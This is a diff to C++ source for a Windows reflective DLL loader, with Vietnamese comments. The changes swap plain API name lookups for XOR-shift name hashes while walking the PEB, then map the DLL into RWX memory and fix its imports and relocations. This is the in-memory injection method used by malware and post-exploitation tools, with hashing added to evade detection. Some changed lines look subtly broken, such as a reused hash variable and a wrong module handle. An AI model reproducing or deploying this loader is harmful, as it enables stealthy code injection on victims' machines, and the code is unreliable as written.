@@ -1,10 +1,6 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
-// Cac con tro ham global
-GETPROCADDRESS pGetProcAdrress; // con tro ham
-VIRTUALALLOC pVirtualAlloc; // con tro ham
-LOADLIBRARYA pLoadLibraryA; // con tro ham
-NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache;   // con tro ham
+
 // Ham Dll tieu chuan
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -22,34 +18,18 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
     return TRUE;
 }
-// Khai bao ham export ReflectiveLoader cua thu vien.
-extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
-    // 0. Lay dia chi cua chinh ham nay trong memory
-    //HMODULE hModule = NULL;
-    //__asm
-    //{
-    //    call getip
-    //getip:
-    //    pop rax
-    //    sub rax, 5
-    //    mov hModule, rax
-    //}
-    ULONG_PTR uLibAddress = (ULONG_PTR)lpBaseAddress;
 
-    //while (TRUE) {
-    //    if (((PIMAGE_DOS_HEADER)uLibAddress)->e_magic == IMAGE_DOS_SIGNATURE) {
-    //        uHeader = ((PIMAGE_DOS_HEADER)uLibAddress)->e_lfanew;
-    //        // Trong x64, mot so instruct co gia tri giong 'MZ', vd: POP r10
-    //        // Vay nen can check gia tri e_lfanew nam trong [64,1024] cho an toan!
-    //        if (uHeader >= sizeof(IMAGE_DOS_HEADER) && uHeader < 1024) {
-    //            uHeader += uLibAddress;
-    //            // break neu tim thay MZ + PE header
-    //            if (((PIMAGE_NT_HEADERS)uHeader)->Signature == IMAGE_NT_SIGNATURE)
-    //                break;
-    //        }
-    //    }
-    //    uLibAddress--;
-    //}
+// Khai bao ham export ReflectiveLoader cua thu vien.
+extern"C" __declspec(dllexport) void WINAPI ReflectiveLoader(LPVOID lpParameter) {
+    // Cac con tro ham
+    GETPROCADDRESS pGetProcAdrress = 0; // con tro ham
+    VIRTUALALLOC pVirtualAlloc = 0; // con tro ham
+    LOADLIBRARYA pLoadLibraryA = 0; // con tro ham
+    NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = 0;   // con tro ham
+    // 0. Lay dia chi cua chinh ham nay trong memory
+  
+    ULONG_PTR uLibAddress = (ULONG_PTR)lpParameter;
+
     // 1. Lay dia chi cac ham API can thiet tu kernel32.dll
 
     // Duyet PEB
@@ -57,17 +37,25 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
     // Lay process loaded modules
     uBaseAddress = (ULONG_PTR)((_PPEB)uBaseAddress)->pLdr;
     // Lay entry trong module list
-    PLIST_ENTRY entry = ((PPEB_LDR_DATA)uBaseAddress)->InMemoryOrderModuleList.Flink;
-   
-    while (entry != &(((PPEB_LDR_DATA)uBaseAddress)->InMemoryOrderModuleList))
+    PLIST_ENTRY entry = ((PPEB_LDR_DATA1)uBaseAddress)->InMemoryOrderModuleList.Flink;
+    
+    while (entry != &(((PPEB_LDR_DATA1)uBaseAddress)->InMemoryOrderModuleList))
     {
-        if (wcscmp(((PLDR_DATA_TABLE_ENTRY)entry)->BaseDllName.pBuffer, L"kernel32.dll") == 0)
+        wchar_t* a = ((PLDR_DATA_TABLE_ENTRY1)entry)->BaseDllName.pBuffer;
+        int hash = 0;
+        while (*a != 0)
         {
-            ULONG_PTR moduleBase = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)entry)->DllBase;
+            hash = hash ^ *a;
+            hash = hash << 1;
+            a++;
+        }
+        if (0x000724e8 == hash)
+        {
+            ULONG_PTR moduleBase = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY1)entry)->DllBase;
             ULONG_PTR moduleNTHeader = moduleBase + ((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew;
-            ULONG_PTR exportBase = (ULONG_PTR) & (((PIMAGE_NT_HEADERS)moduleNTHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
+            ULONG_PTR exportDirVA = ((PIMAGE_NT_HEADERS)moduleNTHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
             
-            ULONG_PTR exportDir = moduleBase + ((PIMAGE_DATA_DIRECTORY)exportBase)->VirtualAddress;
+            ULONG_PTR exportDir = moduleBase + exportDirVA;
             // nameArray la pointer tro toi mang RVA cua cac string name.
             DWORD * nameArray = (DWORD *)(moduleBase + ((PIMAGE_EXPORT_DIRECTORY)exportDir)->AddressOfNames);
             // nameOrdinal la pointer tro toi mang cac Ordinal
@@ -77,24 +65,31 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
             for (DWORD i = 0; i< ((PIMAGE_EXPORT_DIRECTORY)exportDir)->NumberOfNames; i++)
             {
                 char* fName = (char*)(moduleBase + nameArray[i]);
-                if (strcmp(fName, "GetProcAddress") == 0 ) {
+                hash = 0;
+                while (*fName != 0)
+                {
+                    hash = hash ^ *fName;
+                    hash = hash << 1;
+                    fName++;
+                }
+                if (hash == 0x0019e522) {
                     WORD ordinal = nameOrdinal[i];
                     pGetProcAdrress = (GETPROCADDRESS)(moduleBase + addressArray[ordinal]);
                 }
-                if (strcmp(fName, "VirtualAlloc") == 0) {
+                if (hash == 0x00075a7a) {
                     WORD ordinal = nameOrdinal[i];
                     pVirtualAlloc = (VIRTUALALLOC)(moduleBase + addressArray[ordinal]);
                 }
-                if (strcmp(fName, "LoadLibraryA") == 0) {
+                if (hash == 0x00069ea6) {
                     WORD ordinal = nameOrdinal[i];
                     pLoadLibraryA = (LOADLIBRARYA)(moduleBase + addressArray[ordinal]);
                 }
             }
         }
 
-        if (wcscmp(((PLDR_DATA_TABLE_ENTRY)entry)->BaseDllName.pBuffer, L"ntdll.dll") == 0)
+        if (hash == 0x00008c28)
         {
-            ULONG_PTR moduleBase = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)entry)->DllBase;
+            ULONG_PTR moduleBase = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY1)entry)->DllBase;
             ULONG_PTR moduleNTHeader = moduleBase + ((PIMAGE_DOS_HEADER)moduleBase)->e_lfanew;
             ULONG_PTR exportBase = (ULONG_PTR) & (((PIMAGE_NT_HEADERS)moduleNTHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
 
@@ -108,7 +103,14 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
             for (DWORD i = 0; i < ((PIMAGE_EXPORT_DIRECTORY)exportDir)->NumberOfNames; i++)
             {
                 char* fName = (char*)(moduleBase + nameArray[i]);
-                if (strcmp(fName, "NtFlushInstructionCache") == 0) {
+                hash = 0;
+                while (*fName != 0)
+                {
+                    hash = hash ^ *fName;
+                    hash = hash << 1;
+                    fName++;
+                }
+                if (hash == 0x36dde502) {
                     WORD ordinal = nameOrdinal[i];
                     pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(moduleBase + addressArray[ordinal]);
                 }
@@ -117,6 +119,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
         }
         entry = ((PLIST_ENTRY)entry)->Flink;
     }
+    
     //2. Tai DLL tu dang tho thanh image tai 1 vung nho khac trong memory.
     ULONG_PTR uHeader = uLibAddress + ((PIMAGE_DOS_HEADER)uLibAddress)->e_lfanew;
     // allocate memory for DLL to be loaded. Address is arbitrary, all memory is zeros and RWX.
@@ -133,7 +136,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
         uValueA--;
     }
     //3. Load sections.
-    // Vi tri section dau tien nam sau header: firstSec = &OptionalHeader + sizeofoptionalheader
+    // Vi tri section header table nam sau header: firstSec = &OptionalHeader + sizeofoptionalheader
     //uValueA is VA of firstsection
     uValueA = (ULONG_PTR)(&((PIMAGE_NT_HEADERS)uHeader)->OptionalHeader) + ((PIMAGE_NT_HEADERS)uHeader)->FileHeader.SizeOfOptionalHeader;
     ULONG_PTR uValueB = ((PIMAGE_NT_HEADERS)uHeader)->FileHeader.NumberOfSections;
@@ -152,6 +155,7 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
         }
         // Get the next sextion
         uValueA += sizeof(IMAGE_SECTION_HEADER);
+        uValueB--;
     }
     //4. Process import table
     // valueA = RVA of Import directory.
@@ -179,9 +183,9 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
             {
                 // Neu load bang name, IMAGE_THUNK_DATA chua mot con tro tro den cau truc IMAGE_IMPORT_BY_NAME.
                 PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(pThunk->u1.AddressOfData + uBaseAddress); // Day la RVA
-                functionName += uBaseAddress;   // Cong them BaseImage de tro toi dung vi tri.
+                //functionName += uBaseAddress;   // Cong them BaseImage de tro toi dung vi tri.
                 // Lay dia chi voi getProcAddress va tham so IMAGE_IMPORT_BY_NAME->Name.
-                DWORD_PTR funcAddr = (DWORD_PTR)pGetProcAdrress((HMODULE)uValueA, functionName->Name);
+                DWORD_PTR funcAddr = (DWORD_PTR)pGetProcAdrress((HMODULE)uLibAddress, functionName->Name);
                 pThunk->u1.Function = funcAddr; // Ghi vao vung nho dia chi ham.
             }
             pThunk++;   // Sang Thunk ke tiep.
@@ -207,9 +211,10 @@ extern "C" __declspec(dllexport) void ReflectiveLoader(LPVOID lpBaseAddress) {
             // Lay dia chi cua relocation block nay.
             uValueB = uBaseAddress + ((PIMAGE_BASE_RELOCATION)uValueA)->VirtualAddress;
             ULONG_PTR numEntry = (((PIMAGE_BASE_RELOCATION)uValueA)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(IMAGE_RELOC);
-            PIMAGE_RELOC pEntry = (PIMAGE_RELOC)(uValueB + sizeof(IMAGE_BASE_RELOCATION));
+            PIMAGE_RELOC pEntry = (PIMAGE_RELOC)(uValueA + sizeof(IMAGE_BASE_RELOCATION));
             while (numEntry--)
             {
+
                 // Tien hanh relocation toan bo gia tri trong cac entry type-offset.
                 if (pEntry->type == IMAGE_REL_BASED_DIR64)
                     *(ULONG_PTR*)(uValueB + pEntry->offset) += uDelta;  // Gia tri tai BaseImage + pageRVA + offset duoc update.
